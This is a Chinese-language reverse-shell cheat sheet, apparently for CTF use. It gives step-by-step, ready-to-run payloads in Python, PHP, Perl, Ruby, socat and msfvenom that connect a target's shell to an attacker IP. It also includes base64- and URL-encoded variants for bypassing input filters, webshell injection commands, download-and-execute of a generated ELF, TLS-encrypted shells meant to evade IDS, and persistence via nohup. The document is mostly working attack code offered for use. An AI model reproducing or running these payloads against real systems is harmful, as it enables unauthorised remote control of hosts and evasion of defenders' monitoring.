## [reverseshell] 反弹 Shell 速查——拿到命令执行后，第一时间反弹到本地监听。
### [rs-python] Python 反弹 | easy | 反弹shell;python | python反弹;python3;socket反弹
> python/python3 一行反弹（无 nc 场景首选）
#### 这个条目的作用
靶机上没有 nc、`/dev/tcp` 被禁（如用了 sh 而不是 bash）时，用 Python 标准库开一个 TCP 连接并把 shell 的标准输入/输出/错误都重定向到这条连接上，让你在本地监听端获得一个交互式 shell。一句话就能跑，几乎每个 Linux 靶机都有 python 或 python3。
#### 前置条件
- 本地有能收连接的工具：`nc -lvnp 4444`（Linux）或 Ncat（Windows）。
- 靶机能执行命令（命令注入点 / RCE / webshell 里能跑命令）。
- 知道你的**公网或可达 IP**（下文 `1.2.3.4` 替换成它）和监听端口（下文 `4444`）。
- 靶机上确认 python 存在：`python --version` 或 `python3 --version`。
#### 第 1 步：本地开监听
操作：在你自己的机器（Kali / VPS / 本机）开一个终端，先启动监听。
命令：
```bash
nc -lvnp 4444
```
预期结果：出现 `Listening on 0.0.0.0 4444` 且**光标停住不动**，说明监听就绪。
如果不行：报 `nc: invalid option` 说明 nc 版本不同，改用 `ncat -lvnp 4444`；端口被占则换一个高端口（如 8888）并同步改下面 payload 里的端口。
#### 第 2 步：替换 IP 和端口
操作：把下面的 payload 里 `1.2.3.4` 换成你的 IP、`4444` 换成你的监听端口。先**在本地两个终端里自测一遍**（一个监听、一个执行），确认整条链路没写错再上靶机。
命令（完整版，最稳）：
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
```
命令（短一点的可读版，效果相同）：
```python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call("/bin/sh -i",shell=True)'
```
预期结果：监听端窗口出现 shell 提示符（`$` 或 `#`），敲 `id`、`whoami`、`pwd` 有输出。
如果不行：监听端毫无反应，先检查 IP 是否写成了 `127.0.0.1`、防火墙是否放行该端口（本地测试可临时 `ufw allow 4444` 或直接关掉）。
#### 第 3 步：在命令注入点执行
操作：找到命令注入参数（如 `?cmd=`、`?ping=`），在注入点把 payload 拼在后面。注意单引号在 URL 里是特殊字符，裸放可能被截断。
命令（先试试直接拼，注意外层别再用单引号）：
```bash
;python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call("/bin/sh -i",shell=True)'
```
预期结果：监听端收到 shell。
如果不行：页面 500 或 payload 被吃掉，多半是空格/引号/分号被过滤，直接跳到第 4 步（URL 编码）或第 5 步（base64）。
#### 第 4 步：URL 编码版（HTTP 参数里传输）
操作：把 payload 整体 URL 编码后放进参数值。下面这条已经编码好，直接替换 IP 使用：
```bash
?cmd=python3%20-c%20'import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket(socket.AF_INET%2Csocket.SOCK_STREAM)%3Bs.connect((%221.2.3.4%22%2C4444))%3Bos.dup2(s.fileno()%2C0)%3Bos.dup2(s.fileno()%2C1)%3Bos.dup2(s.fileno()%2C2)%3Bp%3Dsubprocess.call(%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D)'
```
预期结果：服务器收到的参数被解码成完整命令并执行，监听端出现 shell。
如果不行：报错说 `python3: can't open file`，说明空格被解码成了换行或参数被拆分，改用第 5 步 base64 方案。
#### 第 5 步：base64 版（引号/空格被过滤时）
操作：payload 先 base64 编码，靶机端 `base64 -d | bash` 解码后执行。整串没有引号和空格（空格在编码后的字符串里不出现），能绕过绝大多数字符过滤。
命令：
```bash
echo 'cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldCgpO3MuY29ubmVjdCgoIjEuMi4zLjQiLDQ0NDQpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpIGZvciBmIGluICgwLDEsMildO3N1YnByb2Nlc3MuY2FsbCgiL2Jpbi9zaCAtaSIsc2hlbGw9VHJ1ZSkn' | base64 -d | bash
```
> [!tip] 上面这串解码后是 `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));...`。要改 IP/端口时，把**自己的新 payload** 用 `echo -n '...' | base64` 重新生成再替换。自造 payload 里的 IP 写 `1.2.3.4` 会被 Python 拒绝连接，所以**必须**重新编码。
预期结果：监听端出现 shell。
如果不行：靶机没有 base64 命令（少见），试 `openssl base64 -d | sh` 或改用第 4 步 URL 编码版。
#### 第 6 步：在 webshell 里执行
操作：PHP 一句话 `?x=` 传参时，把 payload 原样作为参数值 POST 过去（webshell 通常是 `system()` 执行，不需要 URL 编码）。
命令：
```bash
curl -s http://target/shell.php -d 'x=python3 -c '\''import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call("/bin/sh -i",shell=True)'\''
```
预期结果：监听端收到 shell。
如果不行：webshell 的 `system()` 被 `disable_functions` 禁用，换 `exec`/`shell_exec` 型马，或直接换 PHP 反弹（见 rs-php 条目）。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| 监听端毫无反应 | IP/端口写错、防火墙拦了入站 | 先本地两个终端自测；`ufw status` 检查；换高端口 |
| 连接成功但秒断 | 靶机 python 版本没有该 API（如老 python2 无 `subprocess.call` 列表参数） | 换短版 payload；或先 `python --version` 确认 |
| 页面 500 / payload 被截 | 空格、引号、分号被过滤 | 用第 4 步 URL 编码版或第 5 步 base64 版 |
| `can't open file` 报错 | URL 里空格没编码，参数被拆成多个 | 用已编码好的第 4 步版本 |
| 靶机只有 python2 | python3 不存在 | 老版语法：`python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("1.2.3.4",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'` |
#### 实战要点
- 优先级习惯：**bash /dev/tcp > python > nc -e > php > perl**，python 是没 bash 时的第一备选。
- 反弹前先把监听开好；顺序反了连接会立刻失败。
- 靶机在 Docker 里时 `/bin/sh` 一般都在，`/bin/bash` 不一定，payload 里尽量用 `/bin/sh`。
- 拿到的 shell 记得做 TTY 升级（见 rs-helper 条目），不然 `vim`、`su`、`top` 都会报错。
- 比赛结束后退出监听，别留后门。
### [rs-php] PHP 反弹 | easy | 反弹shell;php | php反弹;fsockopen
> PHP fsockopen 反弹一行
#### 这个条目的作用
靶机是 PHP 环境（能执行 `php` 命令，或你手里有个 PHP webshell）时，用 PHP 的 `fsockopen` + `proc_open` 把 `/bin/sh` 挂到一条 TCP 连接上，本地监听端就能拿到交互式 shell。典型场景：LFI 读到的源码是 PHP、靶机装了 php-cli、或者一句话马只能执行 PHP 代码。
#### 前置条件
- 本地监听：`nc -lvnp 4444`。
- 靶机能跑 PHP：命令行 `php -v` 有输出，或有个能执行 PHP 代码的 webshell。
- `fsockopen` 未被 `disable_functions` 禁用（默认不禁）。
#### 第 1 步：本地开监听
操作：自己机器上开终端，启动监听。
命令：
```bash
nc -lvnp 4444
```
预期结果：显示 `Listening on 0.0.0.0 4444` 后光标停住。
如果不行：端口占用就换端口，并同步改 payload 里的 `4444`。
#### 第 2 步：命令行版（php-cli）
操作：把 `1.2.3.4` 换成你的 IP，在靶机的命令注入点执行。`$` 符号会被 shell 展开，所以必须用**单引号**包住整段 PHP 代码。
命令（proc_open 版，最稳）：
```php
php -r '$sock=fsockopen("1.2.3.4",4444);$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);$process=proc_open("/bin/sh -i",$descriptorspec,$pipes);'
```
预期结果：监听端出现 shell 提示符，`id` 有输出。
如果不行：报 `Parse error` 多半是外层引号冲突（被命令注入点的引号吞了），换第 4 步的 base64 或编码写法。
#### 第 3 步：webshell 版（一句话马里跑）
操作：把同样的代码写成一个 PHP 文件上传，或用一句话马的参数传函数名执行。最省事：上传内容如下的 `r.php`，然后**浏览器访问它**：
```php
<?php $sock=fsockopen("1.2.3.4",4444);$descriptorspec=array(0=>$sock,1=>$sock,2=>$sock);$process=proc_open("/bin/sh -i",$descriptorspec,$pipes);?>
```
预期结果：访问 `http://target/r.php` 的瞬间，监听端出现 shell。
如果不行：页面空白是正常的（脚本在等连接），检查监听端；若报 `fsockopen(): unable to connect`，说明 IP/端口不可达或防火墙拦截。
#### 第 4 步：命令注入点里传（引号被过滤时）
操作：命令注入过滤了单引号时，用 URL 编码或双引号包裹。下面用双引号包 PHP 代码（PHP 内部用单引号字符串，无冲突）：
```bash
;php -r "$sock=fsockopen(\"1.2.3.4\",4444);\$descriptorspec=array(0=>\$sock,1=>\$sock,2=>\$sock);\$process=proc_open('/bin/sh -i',\$descriptorspec,\$pipes);"
```
> [!warn] 双引号写法里 `$sock`、`$descriptorspec` 等 `$` 变量会被外层 shell 展开，必须逐个转义成 `\$`，否则 PHP 拿到的是空变量。嫌麻烦就优先用 base64 方案（见 rs-python 条目第 5 步的套路，把 PHP 代码 base64 后 `| php` 执行）。
预期结果：监听端收到 shell。
如果不行：`$` 转义漏了导致变量为空，检查每个 `\$`；或直接换 rs-python / rs-bash 的反弹。
#### 第 5 步：exec 短写法（备选）
操作：`exec` 版代码更短，但依赖「socket 恰好是 fd 3」，不同 PHP 版本下不保证成立，**proc_open 版失败时才试它**。
命令：
```php
php -r '$sock=fsockopen("1.2.3.4",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```
预期结果：监听端出现 shell。
如果不行：无反应是正常的——fd 3 不对，放弃该写法，回退 proc_open 版。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `Parse error` / 语法错 | 外层引号冲突，或 `$` 被 shell 展开 | 换单引号包裹；双引号版记得 `\$` 转义 |
| `fsockopen(): unable to connect` | IP/端口不可达、防火墙拦截 | 本地先自测；检查 IP 是否为公网可达地址 |
| 连接建立但无 shell | `exec` 版的 fd 3 假设不成立 | 改用 proc_open 版（第 2 步） |
| `proc_open()` 被禁 | disable_functions 禁了它 | 换 `popen`/`pcntl_exec`（老 PHP）；或换 python/bash 反弹 |
| webshell 访问后监听端没东西 | 代码没被执行（上传目录不可执行 / 被当静态文件） | 确认访问的是 PHP 解析路径；临时用 `php -r` 命令行验证 |
#### 实战要点
- **`php -r '...'` 的引号规则**：外层单引号最安全，PHP 内部用双引号字符串，`$` 全保留。
- `disable_functions` 是 PHP 题的大坑：`fsockopen`、`proc_open`、`exec` 可能被一起禁，此时别死磕 PHP，换 python/perl 反弹或写文件。
- 反弹成功后可顺手 `export TERM=xterm` 并做 TTY 升级，交互更舒服（见 rs-helper）。
- 靶机 php 版本 < 5 的语法差异基本不影响这两段代码，放心用。
### [rs-perl] Perl / Ruby 反弹 | easy | 反弹shell;perl;ruby | perl反弹;ruby反弹
> Perl 与 Ruby 一行反弹
#### 这个条目的作用
靶机没有 bash 的 `/dev/tcp`、没有 nc、也没有 python 时，用 Perl 或 Ruby 的标准库也能起一条反弹连接。属于「穷尽常见语言后的兜底方案」，平时不常用，但遇到精简容器/特殊环境时能救命。
#### 前置条件
- 本地监听：`nc -lvnp 4444`。
- 靶机装有 perl（`perl -v`）或 ruby（`ruby -v`）。perl 在绝大多数 Linux（含精简镜像）都有；ruby 主要出现在 Rails 应用服务器上。
- 知道自己的可达 IP（下文 `1.2.3.4`）。
#### 第 1 步：本地开监听
操作：自己机器上启动监听。
命令：
```bash
nc -lvnp 4444
```
预期结果：`Listening on 0.0.0.0 4444`，光标停住。
如果不行：换端口并同步改 payload。
#### 第 2 步：Perl 反弹（经典版）
操作：把 `1.2.3.4` 和 `4444` 替换后，在命令注入点执行。外层用单引号包，Perl 内部字符串用双引号，互不冲突。
命令：
```perl
perl -e 'use Socket;$i="1.2.3.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
预期结果：监听端出现 shell，`id` 有输出。
如果不行：报 `Can't locate Socket.pm` 说明靶机 perl 缺 Socket 模块（精简环境常见），换 Ruby 或 python 方案。
#### 第 3 步：Ruby 反弹（一行版）
操作：替换 IP/端口后执行。`-rsocket` 是「加载 socket 库」的简写，必须保留。
命令：
```ruby
ruby -rsocket -e'f=TCPSocket.open("1.2.3.4",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
预期结果：监听端出现 shell。
如果不行：报 `sprintf` 相关错误说明 fd 号异常，换下面的可读版。
#### 第 4 步：Ruby 可读版（自带命令循环，最稳）
操作：这个版本自己读命令、执行、回显，不依赖 fd 假设，兼容性最好。
命令：
```ruby
ruby -rsocket -e 's=TCPSocket.new("1.2.3.4",4444);loop{cmd=s.gets.chomp;IO.popen(cmd,"r"){|io|s.print io.read}}'
```
预期结果：监听端出现 shell，但每条命令执行后才有回显（没有提示符是正常的）。
如果不行：`TCPSocket.new` 抛 `Connection refused`，说明靶机到你的 IP/端口不通，查防火墙。
#### 第 5 步：命令注入点里传（引号处理）
操作：注入点过滤了单引号时，把整段代码 base64 后解码执行（同 rs-python 第 5 步套路），彻底避开引号问题。
命令：
```bash
echo 'cGVybCAtZSAndXNlIFNvY2tldDskaT0iMS4yLjMuNCI7JHA9NDQ0NDtzb2NrZXQoUyxQRl9JTkVULFNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7aWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7b3BlbihTVERJTiwiPiZTIik7b3BlbihTVERPVVQsIj4mUyIpO29wZW4oU1RERVJSLCI+JlMiKTtleGVjKCIvYmluL3NoIC1pIik7fTsn' | base64 -d | sh
```
> [!tip] 上面的 base64 解码后就是第 2 步的 Perl 反弹（IP 为 `1.2.3.4:4444`）。要改 IP/端口，请用 `echo -n '你的新perl代码' | base64` 重新生成，别手改这串。
预期结果：监听端出现 shell。
如果不行：`base64: command not found` 时换 `openssl base64 -d | sh`。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `Can't locate Socket.pm` | 精简 perl 缺 Socket 模块 | 换 Ruby / Python / bash /dev/tcp |
| `Connection refused` / `refused - connect(2)` | IP/端口不通、防火墙拦截 | 本地自测；确认 IP 公网可达；换端口 |
| 有连接但无提示符 | 可读版 Ruby 本就无提示符 | 正常，逐条命令看回显；或换一行版 |
| `sprintf` 报错 / 无回显 | 一行版 Ruby 的 fd 号异常 | 换第 4 步可读版 |
| 单引号被注入点过滤 | payload 无法原样传 | base64 解码执行（第 5 步） |
#### 实战要点
- 使用优先级：**bash /dev/tcp > python > nc -e > php > perl/ruby**，perl/ruby 是最后梯队。
- perl 的 `Socket` 模块在 Debian 精简镜像里也可能缺失，遇到就直接跳 Ruby 或 python。
- Ruby 可读版每条命令起一个子进程，`cd` 等需要状态的命令会「不生效」，想切目录用 `IO.popen` 前先拼 `cd /tmp &&`。
- 同一靶机多试几种语言，哪个能通用哪个，别在一种上死磕。
### [rs-socat] Socat 反弹（含加密） | medium | 反弹shell;socat;加密 | socat反弹;加密反弹
> socat 的普通与 TLS 加密反弹
#### 这个条目的作用
socat 是「万能数据转发器」，既能做监听、也能主动连出去，还支持 TLS 加密。两个场景特别值钱：一是**流量加密反弹**——监听和反弹两端都走 TLS，抓流量的人只看到一堆密文，适合有 WAF/IDS 监控的环境；二是**端口转发/隧道**——把靶机某个内网端口转发到本地。靶机有 socat（`which socat`）时用它最稳。
#### 前置条件
- 本地有 socat：`socat -V` 有输出（Kali 自带；没有就 `apt install socat`）。
- 靶机有 socat：`which socat` 有结果。
- 加密版还需要靶机端能访问你的监听端口 4444（TLS 握手要通）。
#### 第 1 步：本地开明文监听
操作：在自己机器上启动 socat 监听，`fork` 表示每个连接都开一个子进程处理，可以反复连。
命令：
```bash
socat TCP-LISTEN:4444,fork STDOUT
```
预期结果：命令不退出、无输出，光标停住。
如果不行：报 `address already in use` 说明端口被占，换端口。
#### 第 2 步：靶机明文反弹
操作：把 `1.2.3.4` 换成你的 IP，在靶机命令注入点执行。
命令：
```bash
socat TCP:1.2.3.4:4444 EXEC:/bin/sh
```
预期结果：监听端出现 shell 提示符，`id` 有输出。
如果不行：监听端无反应，检查 IP/端口与防火墙；靶机没 socat 就换 python/nc 方案。
#### 第 3 步：生成 TLS 证书（加密版）
操作：在自己的机器上生成自签名证书（`-nodes` 表示不加密私钥，方便直接使用）。
命令：
```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```
预期结果：生成 `key.pem` 和 `cert.pem` 两个文件，期间按回车跳过提问即可。
如果不行：报 `openssl` 不存在则 `apt install openssl`。
#### 第 4 步：TLS 加密监听与反弹
操作：监听端用证书启动 TLS 监听（`verify=0` 表示不校验对端证书，反弹端同样 `verify=0` 即可免证书连接）。注意**两个命令分别在两端执行**：
命令（本地监听）：
```bash
socat OPENSSL-LISTEN:4444,cert=cert.pem,verify=0,fork STDOUT
```
命令（靶机反弹，`1.2.3.4` 换你的 IP）：
```bash
socat OPENSSL:1.2.3.4:4444,verify=0 EXEC:/bin/sh
```
预期结果：监听端出现 shell；用 `tcpdump` 或 Wireshark 抓包能看到流量是密文（`TLSv1.x` 握手后不可读）。
如果不行：监听端报 `SSL_connect` 相关错误，多半是证书路径写错或 `key.pem`/`cert.pem` 不在当前目录，用绝对路径重试。
#### 第 5 步：端口转发（打内网服务）
操作：靶机能访问内网某台机器（如 `127.0.0.1:3306` 数据库、`127.0.0.1:6379` redis）时，用 socat 把内网端口转发到本机可访问的高端口，再用浏览器/客户端直连。以下在**靶机**上执行：
命令：
```bash
socat TCP-LISTEN:8080,fork TCP:127.0.0.1:3306
```
预期结果：本地执行 `mysql -h target_ip -P 8080` 能连上靶机内网的 3306。
如果不行：8080 被占换端口；`TCP:127.0.0.1:3306` 的目标端口要确认内网服务确实在监听（靶机上 `ss -ltn` 看）。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `address already in use` | 端口被占 | 换端口，两边同步改 |
| 监听端无反应 | 靶机没 socat / IP 不通 / 防火墙 | `which socat` 确认；查防火墙 |
| `SSL_connect` 报错 | 证书路径错误、或一端 verify 设置不一致 | 两端都用 `verify=0`；证书用绝对路径 |
| 连接成功但立刻断开 | EXEC 的 shell 路径不存在 | 换 `EXEC:/bin/bash`（确认靶机有） |
| 转发后连不上内网服务 | 内网服务没监听 / 端口写错 | 靶机上 `ss -ltn` 确认真实端口 |
#### 实战要点
- socat 是**双向管道**：`EXEC:/bin/sh` 里还可以加 `pty,stderr,setsid,sigint,sane` 直接拿到完整 TTY（见 rs-helper），这是 socat 相比 nc 的最大优势。
- TLS 加密反弹只在「靶机有 socat + 本地有 socat」时成立，缺一端就退化用 `openssl s_client`/`s_server` 组合（更麻烦，优先装 socat）。
- 打内网 redis/mysql 时，端口转发比写复杂 gopher payload 省事得多，先想到 socat。
- 转发命令要在靶机后台保持运行（`nohup ... &`），别让 shell 一断转发就断。
### [rs-msf] MSF / msfvenom 反弹 | medium | 反弹shell;msf;msfvenom | msfvenom;meterpreter;kali反弹
> msfvenom 生成各平台 payload 与监听
#### 这个条目的作用
msfvenom 是 Metasploit 的 payload 生成器，一条命令生成 Linux/Windows/PHP/Python 等各平台的反弹木马；msfconsole 的 `multi/handler` 负责接收。适合：靶机是 Windows（手工反弹麻烦）、需要生成可执行文件再上传执行、或想用 meterpreter 的丰富后渗透功能（文件系统、截图、键盘记录）。
#### 前置条件
- 本地装有 Metasploit：`msfvenom --version` 和 `msfconsole -v` 有输出（Kali 自带）。
- 知道你的可达 IP（`1.2.3.4`）和监听端口（`4444`）。
- 生成的二进制能传到靶机（上传点 / 下载执行 `/tmp` 等）。
#### 第 1 步：确认靶机架构
操作：先在靶机执行 `uname -m`（Linux）确认 CPU 架构，生成匹配的 ELF，否则 Docker 里直接崩。
命令：
```bash
uname -m
```
预期结果：输出 `x86_64`（64 位）或 `i686`/`i386`（32 位）。
如果不行：命令注入点连 `uname` 都执行不了，先解决 RCE 本身。
#### 第 2 步：生成 Linux ELF 反弹马
操作：按架构选一条，把 `1.2.3.4`、`4444` 换掉。`-f elf` 输出 ELF 格式，`-o r.elf` 写文件。
命令（64 位，最常见）：
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o r.elf
```
命令（32 位老机器）：
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f elf -o r.elf
```
预期结果：输出 `Payload size: ... bytes` 并在当前目录生成 `r.elf`。
如果不行：报 `invalid payload` 说明 payload 名打错，检查是 `linux/x64/` 还是 `linux/x86/` 前缀。
#### 第 3 步：生成其他平台 payload
操作：按靶机环境选一条。PHP 版输出源码（写进 php 文件即可），Python 版输出一行代码，Windows 版输出 exe。
命令：
```bash
# PHP（输出 PHP 源码，存为 r.php 上传）
msfvenom -p php/reverse_php LHOST=1.2.3.4 LPORT=4444 -f raw -o r.php
# Python（输出一行 python 代码，直接粘进命令注入点）
msfvenom -p python/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f raw
# Windows 64 位 exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o r.exe
```
预期结果：对应格式文件/代码生成成功。
如果不行：Windows payload 是 `windows/x64/` 前缀别写成 `win`；PHP 版生成的是源码不是二进制，别拿去直接执行。
#### 第 4 步：msfconsole 开监听
操作：新开一个终端进 msfconsole，逐行输入（`-j` 是后台运行监听）：
命令：
```
msfconsole -q
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
exploit -j
```
> [!warn] `set payload` 必须和生成时**完全一致**（如生成用 `linux/x64/shell_reverse_tcp`，监听就设同一个）；`LHOST` 设 `0.0.0.0` 表示监听所有网卡，靶机才能连进来。
预期结果：出现 `Started reverse TCP handler on 0.0.0.0:4444`，然后光标回到 `msf6>` 提示符。
如果不行：报 `The specified payload is not compatible`，说明 payload 名打错，照第 2/3 步生成时用的名字抄。
#### 第 5 步：上传并执行
操作：把生成的 r.elf 传到靶机（上传功能 / `wget http://你的IP/r.elf`），赋执行权限后运行。监听端马上收连接。
命令（靶机上执行，`你的IP` 换成你本地/HTTP 服务地址）：
```bash
wget http://你的IP:8000/r.elf -O /tmp/r.elf && chmod +x /tmp/r.elf && /tmp/r.elf
```
预期结果：msfconsole 出现 `Meterpreter session 1 opened`（meterpreter 版）或普通 shell 会话；`sessions -i 1` 进入会话。
如果不行：`Permission denied` 是没赋权（`chmod +x`）；`Exec format error` 是架构不匹配，回第 1 步 `uname -m` 重新生成。
#### 第 6 步：不用 msf 也能收（简单 shell）
操作：生成的 `shell_reverse_tcp` 是单段 payload，用 nc 就能收，不必开 msf。
命令：
```bash
nc -lvnp 4444
```
预期结果：靶机执行 r.elf 后 nc 出现 shell。
> [!tip] 如果 msf 收的是 `staged` 型 payload（名字带 `_stage` 或 meterpreter），nc 收不到完整 shell，必须用 msf handler 配合。
#### 常见错误与排查
| 现象 | 原因 | 解决 |
|---|---|---|
| `invalid payload` | payload 名拼错 | 照抄 `linux/x64/shell_reverse_tcp` 这种完整名 |
| `Exec format error` | ELF 架构与靶机 CPU 不匹配 | `uname -m` 确认后重新生成 |
| `Permission denied` | 没赋执行权限 | `chmod +x r.elf` |
| 监听开好了但收不到 | 防火墙拦 4444、或 handler 的 payload 与生成不一致 | `ufw allow 4444`；核对 `set payload` |
| nc 收不到 shell | 用的 staged/meterpreter payload | 用 msf handler 接收 |
| PHP 版执行后无反应 | `php/reverse_php` 需要 PHP 环境解析 | 确认访问的是 php 文件路径，不是直接执行二进制 |
#### 实战要点
- **架构先行**：生成前必查 `uname -m`，Docker 里的 amd64 靶机放 arm64 ELF 直接崩。
- 免杀别指望 msfvenom 默认输出——`-e x86/shikata_ga_nai`（仅 x86）只能过极简单的静态查杀，比赛场景够用，真实目标别当真。
- `sessions -i 1` 进 meterpreter 后先 `shell` 落 bash，再按 rs-helper 升级 TTY。
- 靶机外连受限时，改用 80/443 端口反弹，常见防火墙只放行这两个。
- 比赛结束记得 `sessions -k` 关会话、删掉靶机上的 r.elf。
### [rs-helper] 反弹 Shell 辅助技巧 | easy | 反弹shell;常用技巧 | 反弹技巧;upgrade shell;TTY
> 交互式 TTY、历史记录等反弹后的加工
#### 这个条目的作用
反弹回来的 shell 通常是个「残废」终端：没有提示符、没有历史记录、`vim`/`top`/`su` 报错、按方向键出现 `^[[A`。本条目教你把它升级成完整交互式 TTY，以及解决「shell 一断就没了」「命令没回显」「端口被防火墙卡」等反弹后的常见问题。**拿到 shell 后第一件事就是做 TTY 升级。**
#### 前置条件
- 已经拿到一个能用的反弹 shell（任意方式：bash/python/nc/socat）。
- 靶机上有 python 或 python3（做 TTY 升级用）。
- 本地监听终端支持 Ctrl+Z 挂起（标准终端都支持）。
#### 第 1 步：Python 起伪终端（先让 shell 变交互式）
操作：在**靶机侧**的 shell 里执行，让 `/bin/bash` 跑在一个伪终端（pty）上。
命令：
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
预期结果：出现带提示符的 bash（如 `root@target:/#`），此时已经有基本交互能力。
如果不行：报 `No module named pty` 或没有 python3，试 `python -c 'import pty; pty.spawn("/bin/bash")'`；都没有就用 `script /dev/null -c bash` 或 `SHELL=/bin/bash script -qc /bin/bash`。
#### 第 2 步：Ctrl+Z 挂起 + 本地改 raw 模式（拿完整 TTY）
操作：这是关键一步。先按 **Ctrl+Z** 把当前 shell 会话挂起（回到本地终端），然后在**本地终端**里依次执行两条命令，再输入 `fg` 回到靶机 shell。
命令（本地终端执行）：
```bash
stty raw -echo; fg
```
预期结果：回到靶机 shell 后，方向键正常、`vim`/`top` 能全屏显示、Ctrl+C 只杀当前命令不杀 shell。
如果不行：按 Ctrl+Z 没反应说明本地 shell 不支持，跳过本步，只用第 1 步的伪终端也够用。
#### 第 3 步：设置终端类型与环境变量
操作：回到靶机 shell 后设置 `TERM`，否则 vim 报 `TERM not set`、top 显示异常。
命令：
```bash
export TERM=xterm
export SHELL=/bin/bash
export PS1='\[\e[1;32m\]\u@\h:\w$ \[\e[0m\]'
```
预期结果：`vim` 能正常打开编辑、上下键历史可用（若还不行，配合第 2 步的 raw 模式一起用）。
如果不行：历史键仍输出 `^[[A`，说明 raw 模式没生效，重新走第 2 步。
#### 第 4 步：监听端增强（rlwrap / socat）
操作：下次开监听时直接用增强方式，反弹回来就是好用的终端，省去升级步骤。
命令（本地监听，rlwrap 提供上下键历史）：
```bash
rlwrap nc -lvnp 4444
```
命令（本地监听，socat 全功能 TTY，需要靶机端也装 socat 并配合下面的反弹命令）：
```bash
socat file:$(tty),raw,echo=0 TCP-L:4444
```
命令（靶机端对应的 socat 反弹，`1.2.3.4` 换你的 IP）：
```bash
socat TCP:1.2.3.4:4444 EXEC:"bash -i",pty,stderr,setsid,sigint,sane
```
预期结果：socat 组合拿到的 shell 直接就是完整 TTY，`vim`/`su`/`clear` 全部正常。
如果不行：`rlwrap` 没装就 `apt install rlwrap`；socat 反弹要求两端都有 socat。
#### 第 5 步：shell 保活与常见场景兜底
操作：反弹的 shell 一断就没，用 `setsid`/`nohup` 让它脱离当前会话；其他场景按表处理。
命令（让反弹进程脱离会话、断开后不跟着死）：
```bash
nohup bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1' &
```
预期结果：即使触发反弹的 HTTP 请求结束，监听端 shell 仍在。
如果不行：`nohup` 被禁就换 `setsid bash -c '...'`。
#### 常见错误与排查
| 问题 | 处理 |
|---|---|
| 无 nc 无 python | bash /dev/tcp 或 perl（见 rs-bash / rs-perl） |
| 防火墙只放 80/443 | 反弹端口改 80/443，或用 socat/openssl TLS 加密反弹 |
| 命令注入过滤引号 | base64 解码管道执行（见 rs-python 第 5 步） |
| shell 一断就掉 | 反弹端加 `setsid` 或 `nohup ... &` |
| 容器内无 bash | 用 `/bin/sh` 或 `busybox sh` |
| 反弹后无交互提示符 | `export PS1='$PWD> '` 或重新 `bash -i` |
| vim/top 报错或乱码 | `export TERM=xterm` + 做第 2 步 raw 模式 |
| 方向键输出 `^[[A` | stty raw 没生效，重走第 2 步 |
#### 实战要点
- **拿到 shell 第一步**：python 伪终端 → Ctrl+Z → `stty raw -echo; fg` → `export TERM=xterm`，四步一次做完。
- 最省事组合：监听用 `rlwrap nc -lvnp 4444`，反弹用 `bash -i >& /dev/tcp/IP/4444 0>&1`，回来再 python 提 TTY。
- `stty raw -echo` 后本地终端会「没有回显」，这是正常的，`fg` 之后一切恢复；别以为卡死了。
- 靶机是 Windows 时没有这些命令，反弹回来直接是 cmd/powershell，TTY 升级不适用。
- 反弹端口尽量用 80/443/8080 这类「像正常流量」的端口，既过防火墙又不显眼。
